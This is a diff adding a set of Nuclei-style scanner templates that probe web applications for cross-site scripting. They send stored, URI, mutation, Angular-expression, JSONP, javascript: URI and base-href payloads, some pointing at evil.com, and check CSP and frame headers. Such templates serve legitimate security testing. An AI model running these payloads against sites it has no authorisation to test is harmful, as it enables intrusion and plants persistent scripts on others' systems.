@@ -1,0 +1,211 @@
+id: stored-xss
+info:
+  name: Stored XSS Check
+  author: AniipID
+  severity: high
+  description: Tests for stored cross-site scripting via form submission
+  tags: xss,stored,persistent
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/post"
+      - "{{BaseURL}}/comment"
+      - "{{BaseURL}}/submit"
+      - "{{BaseURL}}/feedback"
+    body: "name=<script>alert(1)</script>&message=test"
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    matchers:
+      - type: word
+        words:
+          - "<script>alert(1)</script>"
+          - "&lt;script&gt;alert(1)&lt;/script&gt;"
+        condition: or
+        name: "stored-xss"
+---
+id: xss-uri-based
+info:
+  name: URI-Based XSS
+  author: AniipID
+  severity: high
+  description: Detects XSS via URI path injection
+  tags: xss,uri,path
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/<script>alert(1)</script>"
+      - "{{BaseURL}}/"><script>alert(1)</script>"
+      - "{{BaseURL}}/test\"><script>alert(1)</script>"
+      - "{{BaseURL}}/';alert(String.fromCharCode(88,83,83));//"
+    matchers:
+      - type: word
+        words:
+          - "<script>alert(1)</script>"
+          - "alert(1)"
+          - "alert(String.fromCharCode"
+        condition: or
+        name: "uri-xss"
+---
+id: xss-mutation
+info:
+  name: Mutation XSS (mXSS)
+  author: AniipID
+  severity: high
+  description: Tests for mutation-based XSS via innerHTML mutations
+  tags: xss,mutation,mxss
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?q=<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">"
+      - "{{BaseURL}}?q=<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>"
+    matchers:
+      - type: word
+        words:
+          - "onerror=alert(1)"
+          - "<noscript>"
+        condition: or
+        name: "mxss-detected"
+---
+id: xss-clickjacking
+info:
+  name: Clickjacking via XSS
+  author: AniipID
+  severity: medium
+  description: Tests for clickjacking vulnerabilities with XSS payload
+  tags: xss,clickjacking,ui-redress
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    matchers:
+      - type: word
+        words:
+          - "X-Frame-Options: DENY"
+          - "X-Frame-Options: SAMEORIGIN"
+          - "frame-ancestors"
+        condition: or
+        part: header
+        name: "frame-options-detected"
+---
+id: xss-csp-eval
+info:
+  name: CSP Evaluation for XSS Risk
+  author: AniipID
+  severity: medium
+  description: Evaluates Content-Security-Policy for XSS protection weaknesses
+  tags: xss,csp,policy
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    matchers:
+      - type: word
+        words:
+          - "Content-Security-Policy"
+          - "script-src"
+          - "unsafe-inline"
+          - "unsafe-eval"
+        condition: or
+        part: header
+        name: "csp-evaluated"
+---
+id: xss-form-action
+info:
+  name: XSS via Form Action
+  author: AniipID
+  severity: high
+  description: Detects XSS via form action attribute injection
+  tags: xss,form,action
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?action=javascript:alert(1)"
+      - "{{BaseURL}}?next=javascript:alert(1)"
+      - "{{BaseURL}}?form=javascript:alert(1)"
+    matchers:
+      - type: word
+        words:
+          - "javascript:alert(1)"
+        name: "form-action-xss"
+---
+id: xss-base-href
+info:
+  name: XSS via <base> href
+  author: AniipID
+  severity: high
+  description: Detects XSS via base href injection for relative URL hijacking
+  tags: xss,base,href
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?href=https://evil.com/"
+      - "{{BaseURL}}?base=https://evil.com/"
+    matchers:
+      - type: word
+        words:
+          - "<base"
+          - "href="
+        condition: or
+        name: "base-href-xss"
+---
+id: xss-angular-expression
+info:
+  name: Angular Expression Injection
+  author: AniipID
+  severity: high
+  description: Tests for Angular template expression injection
+  tags: xss,angular,expression
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?name={{1+1}}"
+      - "{{BaseURL}}?name={{constructor.constructor('alert(1)')()}}"
+    matchers:
+      - type: word
+        words:
+          - "onerror"
+          - "constructor"
+        condition: or
+        name: "angular-expression-xss"
+---
+id: xss-json-callback
+info:
+  name: JSONP Callback XSS
+  author: AniipID
+  severity: high
+  description: Detects XSS in JSONP callback parameters
+  tags: xss,jsonp,callback
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?callback=alert(1)"
+      - "{{BaseURL}}?jsonp=alert(1)"
+      - "{{BaseURL}}?cb=alert(1)"
+    matchers:
+      - type: word
+        words:
+          - "alert(1)"
+          - "alert"
+        condition: or
+        name: "jsonp-xss"
+---
+id: xss-proto-uri
+info:
+  name: Protocol-Based XSS
+  author: AniipID
+  severity: high
+  description: Detects XSS via javascript/data protocol URIs
+  tags: xss,protocol,uri
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?url=javascript:alert(1)"
+      - "{{BaseURL}}?url=data:text/html,<script>alert(1)</script>"
+      - "{{BaseURL}}?link=javascript:alert(1)"
+    matchers:
+      - type: word
+        words:
+          - "javascript:alert"
+          - "data:text/html"
+        condition: or
+        name: "protocol-xss"
